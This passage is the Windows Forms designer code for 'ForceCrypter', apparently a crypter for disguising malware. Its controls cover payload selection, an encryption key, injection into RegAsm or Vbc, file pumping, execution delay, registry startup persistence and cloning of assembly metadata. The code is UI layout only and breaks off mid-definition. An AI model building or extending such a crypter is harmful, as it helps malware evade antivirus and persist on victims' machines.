namespace ForceCrypterSmall
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.nsTheme1 = new NSTheme();
            this.nsControlButton1 = new NSControlButton();
            this.AssemblyTab = new NSTabControl();
            this.MainTab = new System.Windows.Forms.TabPage();
            this.nsGroupBox7 = new NSGroupBox();
            this.rbVbc = new NSRadioButton();
            this.rbRegAsm = new NSRadioButton();
            this.rbItself = new NSRadioButton();
            this.nsGroupBox2 = new NSGroupBox();
            this.txtEncryptionKey = new NSTextBox();
            this.nsRandomPool1 = new NSRandomPool();
            this.nsGroupBox1 = new NSGroupBox();
            this.btnIcon = new NSButton();
            this.btnPayload = new NSButton();
            this.txtIcon = new NSTextBox();
            this.txtPayload = new NSTextBox();
            this.OptionsTab = new System.Windows.Forms.TabPage();
            this.nsGroupBox5 = new NSGroupBox();
            this.cbDelay = new NSOnOffBox();
            this.nsLabel11 = new NSLabel();
            this.txtDelay = new NSTextBox();
            this.nsGroupBox3 = new NSGroupBox();
            this.cbPump = new NSOnOffBox();
            this.rbRandomBytes = new NSRadioButton();
            this.nsLabel1 = new NSLabel();
            this.txtPump = new NSTextBox();
            this.nsGroupBox4 = new NSGroupBox();
            this.nsLabel13 = new NSLabel();
            this.txtFName = new NSTextBox();
            this.txtRegKey = new NSTextBox();
            this.nsLabel12 = new NSLabel();
            this.cbStartup = new NSOnOffBox();
            this.txtStartup = new NSTextBox();
            this.nsLabel2 = new NSLabel();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.btnClone = new NSButton();
            this.btnRandomize = new NSButton();
            this.txtTrademark = new NSTextBox();
            this.txtCopyright = new NSTextBox();
            this.txtFVersion = new NSTextBox();
            this.txtVersion = new NSTextBox();
            this.txtProduct = new NSTextBox();
            this.txtCompany = new NSTextBox();
            this.txtDescription = new NSTextBox();
            this.txtTitle = new NSTextBox();
            this.nsLabel10 = new NSLabel();
            this.nsLabel9 = new NSLabel();
            this.nsLabel8 = new NSLabel();
            this.nsLabel7 = new NSLabel();
            this.nsLabel6 = new NSLabel();
            this.nsLabel5 = new NSLabel();
            this.nsLabel4 = new NSLabel();
            this.nsLabel3 = new NSLabel();
            this.CryptTab = new System.Windows.Forms.TabPage();
            this.btnCrypt = new NSButton();
            this.richTextBox2 = new System.Windows.Forms.RichTextBox();
            this.nsTheme1.SuspendLayout();
            this.AssemblyTab.SuspendLayout();
            this.MainTab.SuspendLayout();
            this.nsGroupBox7.SuspendLayout();
            this.nsGroupBox2.SuspendLayout();
            this.nsGroupBox1.SuspendLayout();
            this.OptionsTab.SuspendLayout();
            this.nsGroupBox5.SuspendLayout();
            this.nsGroupBox3.SuspendLayout();
            this.nsGroupBox4.SuspendLayout();
            this.tabPage3.SuspendLayout();
            this.CryptTab.SuspendLayout();
            this.SuspendLayout();
            // 
            // nsTheme1
            // 
            this.nsTheme1.AccentOffset = 0;
            this.nsTheme1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.nsTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.nsTheme1.Colors = new Bloom[0];
            this.nsTheme1.Controls.Add(this.nsControlButton1);
            this.nsTheme1.Controls.Add(this.AssemblyTab);
            this.nsTheme1.Customization = "";
            this.nsTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.nsTheme1.Font = new System.Drawing.Font("Verdana", 8F);
            this.nsTheme1.Image = null;
            this.nsTheme1.Location = new System.Drawing.Point(0, 0);
            this.nsTheme1.Movable = true;
            this.nsTheme1.Name = "nsTheme1";
            this.nsTheme1.NoRounding = false;
            this.nsTheme1.Sizable = true;
            this.nsTheme1.Size = new System.Drawing.Size(522, 587);
            this.nsTheme1.SmartBounds = true;
            this.nsTheme1.StartPosition = System.Windows.Forms.FormStartPosition.WindowsDefaultLocation;
            this.nsTheme1.TabIndex = 0;
            this.nsTheme1.Text = "ForceCrypter";
            this.nsTheme1.TransparencyKey = System.Drawing.Color.Empty;
            this.nsTheme1.Transparent = false;
            // 
            // nsControlButton1
            // 
            this.nsControlButton1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.nsControlButton1.ControlButton = NSControlButton.Button.Close;
            this.nsControlButton1.Location = new System.Drawing.Point(500, 0);
            this.nsControlButton1.Margin = new System.Windows.Forms.Padding(0);
            this.nsControlButton1.MaximumSize = new System.Drawing.Size(18, 20);
            this.nsControlButton1.MinimumSize = new System.Drawing.Size(18, 20);
            this.nsControlButton1.Name = "nsControlButton1";
            this.nsControlButton1.Size = new System.Drawing.Size(18, 20);
            this.nsControlButton1.TabIndex = 10;
            this.nsControlButton1.Text = "nsControlButton1";
            // 
            // AssemblyTab
            // 
            this.AssemblyTab.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.AssemblyTab.Controls.Add(this.MainTab);
            this.AssemblyTab.Controls.Add(this.OptionsTab);
            this.AssemblyTab.Controls.Add(this.tabPage3);
            this.AssemblyTab.Controls.Add(this.CryptTab);
            this.AssemblyTab.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
            this.AssemblyTab.ItemSize = new System.Drawing.Size(28, 115);
            this.AssemblyTab.Location = new System.Drawing.Point(0, 33);
            this.AssemblyTab.Multiline = true;
            this.AssemblyTab.Name = "AssemblyTab";
            this.AssemblyTab.SelectedIndex = 0;
            this.AssemblyTab.Size = new System.Drawing.Size(519, 554);
            this.AssemblyTab.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.AssemblyTab.TabIndex = 0;
            // 
            // MainTab
            // 
            this.MainTab.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.MainTab.Controls.Add(this.nsGroupBox7);
            this.MainTab.Controls.Add(this.nsGroupBox2);
            this.MainTab.Controls.Add(this.nsGroupBox1);
            this.MainTab.Location = new System.Drawing.Point(119, 4);
            this.MainTab.Name = "MainTab";
            this.MainTab.Padding = new System.Windows.Forms.Padding(3);
            this.MainTab.Size = new System.Drawing.Size(396, 546);
            this.MainTab.TabIndex = 0;
            this.MainTab.Text = "Main";
            // 
            // nsGroupBox7
            // 
            this.nsGroupBox7.Controls.Add(this.rbVbc);
            this.nsGroupBox7.Controls.Add(this.rbRegAsm);
            this.nsGroupBox7.Controls.Add(this.rbItself);
            this.nsGroupBox7.DrawSeperator = false;
            this.nsGroupBox7.Location = new System.Drawing.Point(7, 371);
            this.nsGroupBox7.Name = "nsGroupBox7";
            this.nsGroupBox7.Size = new System.Drawing.Size(216, 138);
            this.nsGroupBox7.SubTitle = "Diffrent injection methods";
            this.nsGroupBox7.TabIndex = 10;
            this.nsGroupBox7.Text = "nsGroupBox7";
            this.nsGroupBox7.Title = "Injection";
            // 
            // rbVbc
            // 
            this.rbVbc.Checked = false;
            this.rbVbc.Location = new System.Drawing.Point(9, 100);
            this.rbVbc.Name = "rbVbc";
            this.rbVbc.Size = new System.Drawing.Size(75, 23);
            this.rbVbc.TabIndex = 2;
            this.rbVbc.Text = "Vbc";
            // 
            // rbRegAsm
            // 
            this.rbRegAsm.Checked = false;
            this.rbRegAsm.Location = new System.Drawing.Point(7, 70);
            this.rbRegAsm.Name = "rbRegAsm";
            this.rbRegAsm.Size = new System.Drawing.Size(75, 23);
            this.rbRegAsm.TabIndex = 1;
            this.rbRegAsm.Text = "RegAsm";
            // 
            // rbItself
            // 
            this.rbItself.Checked = true;
            this.rbItself.Location = new System.Drawing.Point(7, 40);
            this.rbItself.Name = "rbItself";
            this.rbItself.Size = new System.Drawing.Size(75, 23);
            this.rbItself.TabIndex = 0;
            this.rbItself.Text = "Itself";
            // 
            // nsGroupBox2
            // 
            this.nsGroupBox2.Controls.Add(this.txtEncryptionKey);
            this.nsGroupBox2.Controls.Add(this.nsRandomPool1);
            this.nsGroupBox2.DrawSeperator = false;
            this.nsGroupBox2.Location = new System.Drawing.Point(6, 107);
            this.nsGroupBox2.Name = "nsGroupBox2";
            this.nsGroupBox2.Size = new System.Drawing.Size(386, 257);
            this.nsGroupBox2.SubTitle = "Encryption Key";
            this.nsGroupBox2.TabIndex = 9;
            this.nsGroupBox2.Title = "Encryption";
            // 
            // txtEncryptionKey
            // 
            this.txtEncryptionKey.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtEncryptionKey.Location = new System.Drawing.Point(8, 218);
            this.txtEncryptionKey.MaxLength = 3276700;
            this.txtEncryptionKey.Multiline = false;
            this.txtEncryptionKey.Name = "txtEncryptionKey";
            this.txtEncryptionKey.ReadOnly = false;
            this.txtEncryptionKey.Size = new System.Drawing.Size(372, 23);
            this.txtEncryptionKey.TabIndex = 3;
            this.txtEncryptionKey.Text = "Encryption Key";
            this.txtEncryptionKey.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtEncryptionKey.UseSystemPasswordChar = false;
            // 
            // nsRandomPool1
            // 
            this.nsRandomPool1.BackColor = System.Drawing.Color.Black;
            this.nsRandomPool1.ForeColor = System.Drawing.Color.Transparent;
            this.nsRandomPool1.Location = new System.Drawing.Point(8, 43);
            this.nsRandomPool1.Name = "nsRandomPool1";
            this.nsRandomPool1.Size = new System.Drawing.Size(372, 169);
            this.nsRandomPool1.TabIndex = 0;
            this.nsRandomPool1.Text = " ";
            this.nsRandomPool1.ValueChanged += new NSRandomPool.ValueChangedEventHandler(this.nsRandomPool1_ValueChanged);
            // 
            // nsGroupBox1
            // 
            this.nsGroupBox1.Controls.Add(this.btnIcon);
            this.nsGroupBox1.Controls.Add(this.btnPayload);
            this.nsGroupBox1.Controls.Add(this.txtIcon);
            this.nsGroupBox1.Controls.Add(this.txtPayload);
            this.nsGroupBox1.DrawSeperator = false;
            this.nsGroupBox1.Location = new System.Drawing.Point(6, 6);
            this.nsGroupBox1.Name = "nsGroupBox1";
            this.nsGroupBox1.Size = new System.Drawing.Size(385, 95);
            this.nsGroupBox1.SubTitle = "Select a file";
            this.nsGroupBox1.TabIndex = 8;
            this.nsGroupBox1.Title = "Select";
            // 
            // btnIcon
            // 
            this.btnIcon.Location = new System.Drawing.Point(346, 64);
            this.btnIcon.Name = "btnIcon";
            this.btnIcon.Size = new System.Drawing.Size(34, 23);
            this.btnIcon.TabIndex = 11;
            this.btnIcon.Text = "...";
            this.btnIcon.Click += new System.EventHandler(this.btnIcon_Click_1);
            // 
            // btnPayload
            // 
            this.btnPayload.Location = new System.Drawing.Point(346, 31);
            this.btnPayload.Name = "btnPayload";
            this.btnPayload.Size = new System.Drawing.Size(34, 23);
            this.btnPayload.TabIndex = 10;
            this.btnPayload.Text = "...";
            this.btnPayload.Click += new System.EventHandler(this.btnPayload_Click);
            // 
            // txtIcon
            // 
            this.txtIcon.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtIcon.Location = new System.Drawing.Point(10, 65);
            this.txtIcon.MaxLength = 32767;
            this.txtIcon.Multiline = false;
            this.txtIcon.Name = "txtIcon";
            this.txtIcon.ReadOnly = false;
            this.txtIcon.Size = new System.Drawing.Size(331, 23);
            this.txtIcon.TabIndex = 9;
            this.txtIcon.Text = "Icon";
            this.txtIcon.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtIcon.UseSystemPasswordChar = false;
            // 
            // txtPayload
            // 
            this.txtPayload.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtPayload.Location = new System.Drawing.Point(10, 31);
            this.txtPayload.MaxLength = 32767;
            this.txtPayload.Multiline = false;
            this.txtPayload.Name = "txtPayload";
            this.txtPayload.ReadOnly = false;
            this.txtPayload.Size = new System.Drawing.Size(331, 23);
            this.txtPayload.TabIndex = 8;
            this.txtPayload.Text = "Payload";
            this.txtPayload.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPayload.UseSystemPasswordChar = false;
            // 
            // OptionsTab
            // 
            this.OptionsTab.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.OptionsTab.Controls.Add(this.nsGroupBox5);
            this.OptionsTab.Controls.Add(this.nsGroupBox3);
            this.OptionsTab.Controls.Add(this.nsGroupBox4);
            this.OptionsTab.Location = new System.Drawing.Point(119, 4);
            this.OptionsTab.Name = "OptionsTab";
            this.OptionsTab.Padding = new System.Windows.Forms.Padding(3);
            this.OptionsTab.Size = new System.Drawing.Size(396, 546);
            this.OptionsTab.TabIndex = 4;
            this.OptionsTab.Text = "Options";
            // 
            // nsGroupBox5
            // 
            this.nsGroupBox5.Controls.Add(this.cbDelay);
            this.nsGroupBox5.Controls.Add(this.nsLabel11);
            this.nsGroupBox5.Controls.Add(this.txtDelay);
            this.nsGroupBox5.DrawSeperator = false;
            this.nsGroupBox5.Location = new System.Drawing.Point(224, 272);
            this.nsGroupBox5.Name = "nsGroupBox5";
            this.nsGroupBox5.Size = new System.Drawing.Size(169, 130);
            this.nsGroupBox5.SubTitle = "Add some delay";
            this.nsGroupBox5.TabIndex = 12;
            this.nsGroupBox5.Text = "nsGroupBox5";
            this.nsGroupBox5.Title = "Delay";
            // 
            // cbDelay
            // 
            this.cbDelay.Checked = false;
            this.cbDelay.Location = new System.Drawing.Point(3, 40);
            this.cbDelay.MaximumSize = new System.Drawing.Size(56, 24);
            this.cbDelay.MinimumSize = new System.Drawing.Size(56, 24);
            this.cbDelay.Name = "cbDelay";
            this.cbDelay.Size = new System.Drawing.Size(56, 24);
            this.cbDelay.TabIndex = 2;
            this.cbDelay.Text = "nsOnOffBox2";
            // 
            // nsLabel11
            // 
            this.nsLabel11.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel11.Location = new System.Drawing.Point(101, 70);
            this.nsLabel11.Name = "nsLabel11";
            this.nsLabel11.Size = new System.Drawing.Size(66, 23);
            this.nsLabel11.TabIndex = 1;
            this.nsLabel11.Text = "nsLabel11";
            this.nsLabel11.Value1 = "Seconds";
            this.nsLabel11.Value2 = "";
            // 
            // txtDelay
            // 
            this.txtDelay.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtDelay.Location = new System.Drawing.Point(3, 70);
            this.txtDelay.MaxLength = 32767;
            this.txtDelay.Multiline = false;
            this.txtDelay.Name = "txtDelay";
            this.txtDelay.ReadOnly = false;
            this.txtDelay.Size = new System.Drawing.Size(92, 23);
            this.txtDelay.TabIndex = 0;
            this.txtDelay.Text = "Delay time";
            this.txtDelay.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtDelay.UseSystemPasswordChar = false;
            // 
            // nsGroupBox3
            // 
            this.nsGroupBox3.Controls.Add(this.cbPump);
            this.nsGroupBox3.Controls.Add(this.rbRandomBytes);
            this.nsGroupBox3.Controls.Add(this.nsLabel1);
            this.nsGroupBox3.Controls.Add(this.txtPump);
            this.nsGroupBox3.DrawSeperator = false;
            this.nsGroupBox3.Location = new System.Drawing.Point(6, 271);
            this.nsGroupBox3.Name = "nsGroupBox3";
            this.nsGroupBox3.Size = new System.Drawing.Size(211, 131);
            this.nsGroupBox3.SubTitle = "Add size to your file";
            this.nsGroupBox3.TabIndex = 11;
            this.nsGroupBox3.Text = "nsGroupBox3";
            this.nsGroupBox3.Title = "Pumper";
            // 
            // cbPump
            // 
            this.cbPump.Checked = false;
            this.cbPump.Location = new System.Drawing.Point(11, 40);
            this.cbPump.MaximumSize = new System.Drawing.Size(56, 24);
            this.cbPump.MinimumSize = new System.Drawing.Size(56, 24);
            this.cbPump.Name = "cbPump";
            this.cbPump.Size = new System.Drawing.Size(56, 24);
            this.cbPump.TabIndex = 7;
            this.cbPump.Text = "nsOnOffBox1";
            // 
            // rbRandomBytes
            // 
            this.rbRandomBytes.Checked = false;
            this.rbRandomBytes.Location = new System.Drawing.Point(39, 100);
            this.rbRandomBytes.Name = "rbRandomBytes";
            this.rbRandomBytes.Size = new System.Drawing.Size(116, 23);
            this.rbRandomBytes.TabIndex = 6;
            this.rbRandomBytes.Text = "Random Bytes";
            // 
            // nsLabel1
            // 
            this.nsLabel1.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel1.Location = new System.Drawing.Point(180, 71);
            this.nsLabel1.Name = "nsLabel1";
            this.nsLabel1.Size = new System.Drawing.Size(28, 23);
            this.nsLabel1.TabIndex = 5;
            this.nsLabel1.Text = "nsLabel1";
            this.nsLabel1.Value1 = "K";
            this.nsLabel1.Value2 = "B";
            // 
            // txtPump
            // 
            this.txtPump.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtPump.Location = new System.Drawing.Point(10, 71);
            this.txtPump.MaxLength = 32767;
            this.txtPump.Multiline = false;
            this.txtPump.Name = "txtPump";
            this.txtPump.ReadOnly = false;
            this.txtPump.Size = new System.Drawing.Size(164, 23);
            this.txtPump.TabIndex = 4;
            this.txtPump.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPump.UseSystemPasswordChar = false;
            // 
            // nsGroupBox4
            // 
            this.nsGroupBox4.Controls.Add(this.nsLabel13);
            this.nsGroupBox4.Controls.Add(this.txtFName);
            this.nsGroupBox4.Controls.Add(this.txtRegKey);
            this.nsGroupBox4.Controls.Add(this.nsLabel12);
            this.nsGroupBox4.Controls.Add(this.cbStartup);
            this.nsGroupBox4.Controls.Add(this.txtStartup);
            this.nsGroupBox4.Controls.Add(this.nsLabel2);
            this.nsGroupBox4.DrawSeperator = false;
            this.nsGroupBox4.Location = new System.Drawing.Point(6, 6);
            this.nsGroupBox4.Name = "nsGroupBox4";
            this.nsGroupBox4.Size = new System.Drawing.Size(387, 221);
            this.nsGroupBox4.SubTitle = "Add the file to startup";
            this.nsGroupBox4.TabIndex = 7;
            this.nsGroupBox4.Title = "Startup";
            // 
            // nsLabel13
            // 
            this.nsLabel13.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel13.Location = new System.Drawing.Point(11, 110);
            this.nsLabel13.Name = "nsLabel13";
            this.nsLabel13.Size = new System.Drawing.Size(103, 23);
            this.nsLabel13.TabIndex = 15;
            this.nsLabel13.Text = "nsLabel13";
            this.nsLabel13.Value1 = "FolderName";
            this.nsLabel13.Value2 = ":";
            // 
            // txtFName
            // 
            this.txtFName.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtFName.Location = new System.Drawing.Point(120, 111);
            this.txtFName.MaxLength = 32767;
            this.txtFName.Multiline = false;
            this.txtFName.Name = "txtFName";
            this.txtFName.ReadOnly = false;
            this.txtFName.Size = new System.Drawing.Size(266, 23);
            this.txtFName.TabIndex = 14;
            this.txtFName.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtFName.UseSystemPasswordChar = false;
            // 
            // txtRegKey
            // 
            this.txtRegKey.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtRegKey.Location = new System.Drawing.Point(92, 146);
            this.txtRegKey.MaxLength = 32767;
            this.txtRegKey.Multiline = false;
            this.txtRegKey.Name = "txtRegKey";
            this.txtRegKey.ReadOnly = false;
            this.txtRegKey.Size = new System.Drawing.Size(294, 23);
            this.txtRegKey.TabIndex = 13;
            this.txtRegKey.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtRegKey.UseSystemPasswordChar = false;
            // 
            // nsLabel12
            // 
            this.nsLabel12.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel12.Location = new System.Drawing.Point(11, 146);
            this.nsLabel12.Name = "nsLabel12";
            this.nsLabel12.Size = new System.Drawing.Size(75, 23);
            this.nsLabel12.TabIndex = 12;
            this.nsLabel12.Text = "nsLabel12";
            this.nsLabel12.Value1 = "RegKey";
            this.nsLabel12.Value2 = ":";
            // 
            // cbStartup
            // 
            this.cbStartup.Checked = false;
            this.cbStartup.Location = new System.Drawing.Point(11, 33);
            this.cbStartup.MaximumSize = new System.Drawing.Size(56, 24);
            this.cbStartup.MinimumSize = new System.Drawing.Size(56, 24);
            this.cbStartup.Name = "cbStartup";
            this.cbStartup.Size = new System.Drawing.Size(56, 24);
            this.cbStartup.TabIndex = 11;
            this.cbStartup.Text = "nsOnOffBox1";
            // 
            // txtStartup
            // 
            this.txtStartup.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtStartup.Location = new System.Drawing.Point(91, 73);
            this.txtStartup.MaxLength = 32767;
            this.txtStartup.Multiline = false;
            this.txtStartup.Name = "txtStartup";
            this.txtStartup.ReadOnly = false;
            this.txtStartup.Size = new System.Drawing.Size(295, 23);
            this.txtStartup.TabIndex = 10;
            this.txtStartup.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStartup.UseSystemPasswordChar = false;
            // 
            // nsLabel2
            // 
            this.nsLabel2.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel2.Location = new System.Drawing.Point(10, 73);
            this.nsLabel2.Name = "nsLabel2";
            this.nsLabel2.Size = new System.Drawing.Size(75, 23);
            this.nsLabel2.TabIndex = 9;
            this.nsLabel2.Text = "nsLabel2";
            this.nsLabel2.Value1 = "FileName";
            this.nsLabel2.Value2 = ":";
            // 
            // tabPage3
            // 
            this.tabPage3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabPage3.Controls.Add(this.btnClone);
            this.tabPage3.Controls.Add(this.btnRandomize);
            this.tabPage3.Controls.Add(this.txtTrademark);
            this.tabPage3.Controls.Add(this.txtCopyright);
            this.tabPage3.Controls.Add(this.txtFVersion);
            this.tabPage3.Controls.Add(this.txtVersion);
            this.tabPage3.Controls.Add(this.txtProduct);
            this.tabPage3.Controls.Add(this.txtCompany);
            this.tabPage3.Controls.Add(this.txtDescription);
            this.tabPage3.Controls.Add(this.txtTitle);
            this.tabPage3.Controls.Add(this.nsLabel10);
            this.tabPage3.Controls.Add(this.nsLabel9);
            this.tabPage3.Controls.Add(this.nsLabel8);
            this.tabPage3.Controls.Add(this.nsLabel7);
            this.tabPage3.Controls.Add(this.nsLabel6);
            this.tabPage3.Controls.Add(this.nsLabel5);
            this.tabPage3.Controls.Add(this.nsLabel4);
            this.tabPage3.Controls.Add(this.nsLabel3);
            this.tabPage3.Location = new System.Drawing.Point(119, 4);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage3.Size = new System.Drawing.Size(396, 546);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "Assembly";
            // 
            // btnClone
            // 
            this.btnClone.Location = new System.Drawing.Point(228, 374);
            this.btnClone.Name = "btnClone";
            this.btnClone.Size = new System.Drawing.Size(75, 23);
            this.btnClone.TabIndex = 56;
            this.btnClone.Text = "Clone";
            this.btnClone.Click += new System.EventHandler(this.btnClone_Click_1);
            // 
            // btnRandomize
            // 
            this.btnRandomize.Location = new System.Drawing.Point(109, 375);
            this.btnRandomize.Name = "btnRandomize";
            this.btnRandomize.Size = new System.Drawing.Size(75, 23);
            this.btnRandomize.TabIndex = 55;
            this.btnRandomize.Text = "Randomize";
            this.btnRandomize.Click += new System.EventHandler(this.btnRandomize_Click_1);
            // 
            // txtTrademark
            // 
            this.txtTrademark.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtTrademark.Location = new System.Drawing.Point(109, 337);
            this.txtTrademark.MaxLength = 32767;
            this.txtTrademark.Multiline = false;
            this.txtTrademark.Name = "txtTrademark";
            this.txtTrademark.ReadOnly = false;
            this.txtTrademark.Size = new System.Drawing.Size(281, 23);
            this.txtTrademark.TabIndex = 54;
            this.txtTrademark.Text = "nsTextBox1";
            this.txtTrademark.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtTrademark.UseSystemPasswordChar = false;
            // 
            // txtCopyright
            // 
            this.txtCopyright.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtCopyright.Location = new System.Drawing.Point(110, 289);
            this.txtCopyright.MaxLength = 32767;
            this.txtCopyright.Multiline = false;
            this.txtCopyright.Name = "txtCopyright";
            this.txtCopyright.ReadOnly = false;
            this.txtCopyright.Size = new System.Drawing.Size(280, 23);
            this.txtCopyright.TabIndex = 53;
            this.txtCopyright.Text = "nsTextBox1";
            this.txtCopyright.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtCopyright.UseSystemPasswordChar = false;
            // 
            // txtFVersion
            // 
            this.txtFVersion.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtFVersion.Location = new System.Drawing.Point(109, 246);
            this.txtFVersion.MaxLength = 32767;
            this.txtFVersion.Multiline = false;
            this.txtFVersion.Name = "txtFVersion";
            this.txtFVersion.ReadOnly = false;
            this.txtFVersion.Size = new System.Drawing.Size(281, 23);
            this.txtFVersion.TabIndex = 52;
            this.txtFVersion.Text = "0.0.0.0";
            this.txtFVersion.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtFVersion.UseSystemPasswordChar = false;
            // 
            // txtVersion
            // 
            this.txtVersion.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtVersion.Location = new System.Drawing.Point(109, 200);
            this.txtVersion.MaxLength = 32767;
            this.txtVersion.Multiline = false;
            this.txtVersion.Name = "txtVersion";
            this.txtVersion.ReadOnly = false;
            this.txtVersion.Size = new System.Drawing.Size(281, 23);
            this.txtVersion.TabIndex = 51;
            this.txtVersion.Text = "0.0.0.0";
            this.txtVersion.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtVersion.UseSystemPasswordChar = false;
            // 
            // txtProduct
            // 
            this.txtProduct.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtProduct.Location = new System.Drawing.Point(110, 155);
            this.txtProduct.MaxLength = 32767;
            this.txtProduct.Multiline = false;
            this.txtProduct.Name = "txtProduct";
            this.txtProduct.ReadOnly = false;
            this.txtProduct.Size = new System.Drawing.Size(280, 23);
            this.txtProduct.TabIndex = 50;
            this.txtProduct.Text = "nsTextBox1";
            this.txtProduct.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtProduct.UseSystemPasswordChar = false;
            // 
            // txtCompany
            // 
            this.txtCompany.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtCompany.Location = new System.Drawing.Point(110, 110);
            this.txtCompany.MaxLength = 32767;
            this.txtCompany.Multiline = false;
            this.txtCompany.Name = "txtCompany";
            this.txtCompany.ReadOnly = false;
            this.txtCompany.Size = new System.Drawing.Size(280, 23);
            this.txtCompany.TabIndex = 49;
            this.txtCompany.Text = "nsTextBox1";
            this.txtCompany.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtCompany.UseSystemPasswordChar = false;
            // 
            // txtDescription
            // 
            this.txtDescription.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtDescription.Location = new System.Drawing.Point(110, 70);
            this.txtDescription.MaxLength = 32767;
            this.txtDescription.Multiline = false;
            this.txtDescription.Name = "txtDescription";
            this.txtDescription.ReadOnly = false;
            this.txtDescription.Size = new System.Drawing.Size(280, 23);
            this.txtDescription.TabIndex = 48;
            this.txtDescription.Text = "nsTextBox1";
            this.txtDescription.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtDescription.UseSystemPasswordChar = false;
            // 
            // txtTitle
            // 
            this.txtTitle.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtTitle.Location = new System.Drawing.Point(109, 24);
            this.txtTitle.MaxLength = 32767;
            this.txtTitle.Multiline = false;
            this.txtTitle.Name = "txtTitle";
            this.txtTitle.ReadOnly = false;
            this.txtTitle.Size = new System.Drawing.Size(281, 23);
            this.txtTitle.TabIndex = 47;
            this.txtTitle.Text = "nsTextBox1";
            this.txtTitle.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtTitle.UseSystemPasswordChar = false;
            // 
            // nsLabel10
            // 
            this.nsLabel10.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel10.Location = new System.Drawing.Point(10, 338);
            this.nsLabel10.Name = "nsLabel10";
            this.nsLabel10.Size = new System.Drawing.Size(93, 23);
            this.nsLabel10.TabIndex = 46;
            this.nsLabel10.Text = "nsLabel10";
            this.nsLabel10.Value1 = "Trademark";
            this.nsLabel10.Value2 = ":";
            // 
            // nsLabel9
            // 
            this.nsLabel9.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel9.Location = new System.Drawing.Point(10, 290);
            this.nsLabel9.Name = "nsLabel9";
            this.nsLabel9.Size = new System.Drawing.Size(93, 23);
            this.nsLabel9.TabIndex = 45;
            this.nsLabel9.Text = "nsLabel9";
            this.nsLabel9.Value1 = "Copyright";
            this.nsLabel9.Value2 = ":";
            // 
            // nsLabel8
            // 
            this.nsLabel8.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel8.Location = new System.Drawing.Point(10, 247);
            this.nsLabel8.Name = "nsLabel8";
